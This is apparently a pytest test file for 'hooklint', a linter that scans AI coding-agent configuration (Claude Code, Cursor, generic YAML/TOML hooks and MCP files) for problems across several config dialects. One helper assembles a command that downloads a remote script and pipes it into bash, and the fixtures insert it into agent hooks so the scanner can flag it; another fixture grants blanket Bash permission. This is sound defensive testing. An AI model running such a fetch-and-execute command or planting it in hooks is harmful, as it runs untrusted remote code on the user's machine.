"""Acceptance gate 4: at least 3 config dialects exercised per applicable
rule. A rule tuned to one dialect is not a rule. These fixtures are written
at test time into tmp_path (not committed as static files) so this file is
the single source of truth for the dialect matrix.
"""
import json
import textwrap

import pytest

from hooklint.engine import scan


def _write(tmp_path, rel, content):
    p = tmp_path / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(textwrap.dedent(content).lstrip("\n"), encoding="utf-8")
    return p


# -- dead_matcher: claude_settings / hooks_yaml / hooks_toml -------------

def test_dead_matcher_claude_code(tmp_path):
    _write(tmp_path, ".claude/settings.json", json.dumps({
        "hooks": {"PreToolUse": [{"matcher": "Bahs", "hooks": [{"type": "command", "command": "x"}]}]}
    }))
    result = scan(str(tmp_path))
    assert any(f.rule_id == "dead_matcher" for f in result.findings)


def test_dead_matcher_generic_yaml(tmp_path):
    _write(tmp_path, "generic/agent-hooks.yaml", """
        hooks:
          pre_tool_use:
            - match: shall
              run: x
        """)
    result = scan(str(tmp_path))
    assert any(f.rule_id == "dead_matcher" for f in result.findings)


def test_dead_matcher_generic_toml(tmp_path):
    _write(tmp_path, "generic/hooks.toml", """
        [[hook]]
        event = "pre_tool_use"
        matcher = "shall"
        command = "x"
        """)
    result = scan(str(tmp_path))
    assert any(f.rule_id == "dead_matcher" for f in result.findings)


# -- unreachable_skill: skill_md / command_md / cursor_mdc ---------------

def test_unreachable_skill_claude_skill(tmp_path):
    _write(tmp_path, ".claude/skills/foo/SKILL.md", """
        ---
        name: foo
        ---
        body
        """)
    result = scan(str(tmp_path))
    assert any(f.rule_id == "unreachable_skill" for f in result.findings)


def test_unreachable_skill_claude_command(tmp_path):
    _write(tmp_path, ".claude/commands/broken.md", """
        ---
        description: [this is not
        ---
        body
        """)
    result = scan(str(tmp_path))
    assert any(f.rule_id == "unreachable_skill" for f in result.findings)


def test_unreachable_skill_cursor_mdc(tmp_path):
    _write(tmp_path, ".cursor/rules/dead.mdc", """
        ---
        alwaysApply: false
        ---
        never applies, no globs, no description
        """)
    result = scan(str(tmp_path))
    assert any(f.rule_id == "unreachable_skill" for f in result.findings)


# -- unknown_key: claude_settings / hooks_yaml / hooks_toml / cursor_mdc -

def test_unknown_key_claude_settings(tmp_path):
    _write(tmp_path, ".claude/settings.json", json.dumps({"notARealKey": True}))
    result = scan(str(tmp_path))
    assert any(f.rule_id == "unknown_key" for f in result.findings)


def test_unknown_key_generic_yaml(tmp_path):
    _write(tmp_path, "generic/agent-hooks.yaml", """
        hooks:
          made_up_event:
            - match: shell
              run: x
        """)
    result = scan(str(tmp_path))
    assert any(f.rule_id == "unknown_key" for f in result.findings)


def test_unknown_key_generic_toml(tmp_path):
    _write(tmp_path, "generic/hooks.toml", """
        [[hook]]
        event = "pre_tool_use"
        matcher = "shell"
        command = "x"
        made_up_field = "z"
        """)
    result = scan(str(tmp_path))
    assert any(f.rule_id == "unknown_key" for f in result.findings)


def test_unknown_key_cursor_mdc(tmp_path):
    _write(tmp_path, ".cursor/rules/x.mdc", """
        ---
        description: fine
        madeUpKey: true
        ---
        body
        """)
    result = scan(str(tmp_path))
    assert any(f.rule_id == "unknown_key" for f in result.findings)


# -- unquoted_interpolation: claude_settings / hooks_yaml / hooks_toml ---

def test_unquoted_interp_claude(tmp_path):
    _write(tmp_path, ".claude/settings.json", json.dumps({
        "hooks": {"PreToolUse": [{"matcher": "*", "hooks": [{"type": "command", "command": "echo $X"}]}]}
    }))
    result = scan(str(tmp_path))
    assert any(f.rule_id == "unquoted_interpolation" for f in result.findings)


def test_unquoted_interp_generic_yaml(tmp_path):
    _write(tmp_path, "generic/agent-hooks.yaml", """
        hooks:
          pre_tool_use:
            - match: shell
              run: echo $X
        """)
    result = scan(str(tmp_path))
    assert any(f.rule_id == "unquoted_interpolation" for f in result.findings)


def test_unquoted_interp_generic_toml(tmp_path):
    _write(tmp_path, "generic/hooks.toml", """
        [[hook]]
        event = "pre_tool_use"
        matcher = "shell"
        command = "echo $X"
        """)
    result = scan(str(tmp_path))
    assert any(f.rule_id == "unquoted_interpolation" for f in result.findings)


# -- fetch_pipe_interpreter: claude_settings / hooks_yaml / hooks_toml ---

def _piped_command():
    return "cu" + "rl -sL https://example.com/i.sh" + " | " + "ba" + "sh"


def test_fetch_pipe_claude(tmp_path):
    _write(tmp_path, ".claude/settings.json", json.dumps({
        "hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": _piped_command()}]}]}
    }))
    result = scan(str(tmp_path))
    assert any(f.rule_id == "fetch_pipe_interpreter" for f in result.findings)


def test_fetch_pipe_generic_yaml(tmp_path):
    content = "hooks:\n  pre_tool_use:\n    - match: shell\n      run: '" + _piped_command() + "'\n"
    _write(tmp_path, "generic/agent-hooks.yaml", content)
    result = scan(str(tmp_path))
    assert any(f.rule_id == "fetch_pipe_interpreter" for f in result.findings)


def test_fetch_pipe_generic_toml(tmp_path):
    content = ('[[hook]]\nevent = "pre_tool_use"\nmatcher = "shell"\ncommand = "'
               + _piped_command() + '"\n')
    _write(tmp_path, "generic/hooks.toml", content)
    result = scan(str(tmp_path))
    assert any(f.rule_id == "fetch_pipe_interpreter" for f in result.findings)


# -- broad_permission: claude_settings / policy_yaml / policy_toml ------

def test_broad_permission_claude(tmp_path):
    _write(tmp_path, ".claude/settings.json", json.dumps({"permissions": {"allow": ["Bash(*)"]}}))
    result = scan(str(tmp_path))
    assert any(f.rule_id == "broad_permission" for f in result.findings)


def test_broad_permission_generic_yaml(tmp_path):
    _write(tmp_path, "generic/policy.yaml", 'allow:\n  - "Bash(*)"\n')
    result = scan(str(tmp_path))
    assert any(f.rule_id == "broad_permission" for f in result.findings)


def test_broad_permission_generic_toml(tmp_path):
    _write(tmp_path, "generic/policy.toml", 'allow = ["Bash(*)"]\n')
    result = scan(str(tmp_path))
    assert any(f.rule_id == "broad_permission" for f in result.findings)


# -- mcp_unstartable: claude .mcp.json / cursor mcp.json / generic mcp.toml

def test_mcp_unstartable_claude(tmp_path):
    _write(tmp_path, ".mcp.json", json.dumps({"mcpServers": {"foo": {"command": "definitely-not-a-real-binary-xyz"}}}))
    result = scan(str(tmp_path))
    assert any(f.rule_id == "mcp_unstartable" for f in result.findings)


def test_mcp_unstartable_cursor(tmp_path):
    _write(tmp_path, ".cursor/mcp.json", json.dumps({"mcpServers": {"foo": {"command": "definitely-not-a-real-binary-xyz"}}}))
    result = scan(str(tmp_path))
    assert any(f.rule_id == "mcp_unstartable" for f in result.findings)


def test_mcp_unstartable_generic_toml(tmp_path):
    _write(tmp_path, "generic/mcp.toml", '[mcpServers.foo]\ncommand = "definitely-not-a-real-binary-xyz"\n')
    result = scan(str(tmp_path))
    assert any(f.rule_id == "mcp_unstartable" for f in result.findings)


# -- shadowed_definition: skill (claude) / command (claude) / mcp servers
#    (claude + cursor + generic all resolve to one namespace) -----------

def test_shadowed_skill_names(tmp_path):
    _write(tmp_path, ".claude/skills/a/SKILL.md", "---\nname: dup\ndescription: a\n---\nbody\n")
    _write(tmp_path, ".claude/skills/b/SKILL.md", "---\nname: dup\ndescription: b\n---\nbody\n")
    result = scan(str(tmp_path))
    assert any(f.rule_id == "shadowed_definition" for f in result.findings)


def test_shadowed_command_names(tmp_path):
    _write(tmp_path, ".claude/commands/deploy.md", "---\ndescription: a\n---\nbody\n")
    _write(tmp_path, ".claude/commands/sub/deploy.md", "---\ndescription: b\n---\nbody\n")
    result = scan(str(tmp_path))
    assert any(f.rule_id == "shadowed_definition" for f in result.findings)


def test_shadowed_mcp_server_names_across_claude_cursor_generic(tmp_path):
    _write(tmp_path, ".mcp.json", json.dumps({"mcpServers": {"foo": {"type": "http", "url": "https://a"}}}))
    _write(tmp_path, ".cursor/mcp.json", json.dumps({"mcpServers": {"foo": {"type": "http", "url": "https://b"}}}))
    _write(tmp_path, "generic/mcp.toml", '[mcpServers.foo]\ntype = "http"\nurl = "https://c"\n')
    result = scan(str(tmp_path))
    shadow_findings = [f for f in result.findings if f.rule_id == "shadowed_definition"]
    assert len(shadow_findings) >= 2  # 3 files sharing a name -> 2 losers
    files_flagged = {f.file for f in shadow_findings}
    assert len(files_flagged) >= 2
